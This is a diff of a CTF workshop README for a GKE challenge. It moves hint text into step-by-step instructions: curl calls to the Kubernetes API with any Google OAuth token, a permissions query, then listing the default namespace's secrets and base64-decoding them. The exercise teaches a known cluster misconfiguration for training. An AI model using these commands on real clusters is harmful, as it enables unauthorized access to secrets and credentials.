@@ -12,7 +12,6 @@ To play this CTF and participate in our workshop you will need:
 - A notebook and an internet connection
 - A Google account. Any Google account such as `your-throwaway@gmail.com ` is enough. It does not have to be a Google Cloud account. 
 - The [gcloud](https://cloud.google.com/sdk/docs/install) command line utility installed on your computer.
-- The kubectl utility installed on your computer. You can install it as a component of gcloud: `gcloud components install kubectl`
 
 ## Your starting point
 
@@ -31,53 +30,57 @@ The IP belongs to a Google Kubernets Cluster (GKE) - how can you access the Kube
 
 To simplify your next commands, set the IP address as an environment variable: `export IP=<IP>`.
 
+You can access the API of the cluster at this endpoint:  
+##
+    curl -k https://$IP
+
+As you are not authenticated, you are part of the group `system:anonymous` and you can't access much.  
+For example, try accessing the api endpoint:  
+##
+    curl -k https://$IP/api
+It will respond with 403 permission denied.  
+
+But what if you were in `system:authenticated`? 
+Try to get a token for your own Google account using the OAuth playground (select scope "Kubernetes Engine API v1").  
+
+Set your token as environment variable to make the next commands easier to use.  
+##
+    export TOKEN=<token>
+
+Send a request with your token to the Kubernetes API:  
+##
+    curl -k -H "Authorization:Bearer <token>" https://$IP/api/
+
+Just by supplying any Google access token you will be able to access the endpoint!  
+
 Once you obtained access and can read from the Kubernets API - what API resources can you query?
+
+You can find out which permissions 'system:authenticated' has on this cluster with a request to this endpoint:  
+##
+    curl -k -X POST -H "Content-Type: application/json" -d '{"apiVersion":"authorization.k8s.io/v1", "kind":"SelfSubjectRulesReview", "spec":{"namespace":"default"}}' -H "Authorization:Bearer $TOKEN" https://$IP/apis/authorization.k8s.io/v1/selfsubjectrulesreviews
+
+It looks like you have read access to some resources on the default namespace of the cluster.
+
+#### Hints
+
+<details>
+  <summary>Hint 1</summary>
+
+  You can read Kubernetes secrets in the default namespace on the cluster. Which secrets might it hold?  
+  ##
+      curl -k -H "Authorization:Bearer $TOKEN" https://$IP/api/v1/namespaces/default/secrets
+  The secret values are base64 encoded. Decode them to read the value:  
+  ##
+      echo -n <secret-value> | base64 -d  
+
+</details>
 
 #### Useful commands and tools:
 
 - `curl -k https://<IP>`
 - `curl -k -H "Authorization:Bearer <token>" https://<IP>/api/v1/...`
 - [Google OAuth Playground](https://developers.google.com/oauthplayground/)
-
-#### Hints
-<details>
-  <summary>Hint 1</summary>
-
-    You found a GKE (Google Kubernetes Engine) cluster.  
-    As you are not authenticated, you are part of the group `system:anonymous` and you can't access much.  
-    But what if you were in `system:authenticated`? 
-    Try to get a token for your own Google account using the oauthplayground and authenticate using the Kubernetes API.
-
-</details>
-  
-  
-
-<details>
-  <summary>Hint 2</summary>
-
-    system:authenticated` will require you to present a Google access token.  
-    It can be any token - also for your own Google account that is not associated with our target GCP project.  
-    You can use the [oauth playground](https://developers.google.com/oauthplayground/) to get an access token.  
-    Select "Kubernetes Engine API v1" as a scope and exchange your authorization code for an access token.  
-    
-    Once you have the token there is an endpoint that allows you to query the Kubernetes API:
-    
-    curl -k -X POST -H "Content-Type: application/json" -d '{"apiVersion":"authorization.k8s.io/v1", "kind":"SelfSubjectRulesReview", "spec":{"namespace":"default"}}' -H "Authorization:Bearer $TOKEN" https://$IP/apis/authorization.k8s.io/v1/selfsubjectrulesreviews
-    
-    It looks like you have read access to some resources on the default namespace of the cluster. Start enumerating some that might be interesting.
-
-</details>
-
-<details>
-  <summary>Hint 3</summary>
-
-    You can read all resources in the `file-uploader` namespace on the cluster. Which secrets might it hold?  
-    `curl -k -H "Authorization:Bearer $TOKEN" https://$IP/api/v1/namespaces/default/secrets`  
-    The secret values are base64 encoded. Decode them to read the value:  
-    `echo -n <secret-value> | base64 -d  
-
-</details>
-  
+- Learn more about this misconfiguration [here](https://orca.security/resources/blog/sys-all-google-kubernetes-engine-risk)
 
 ### Challenge 2: State of affairs
 
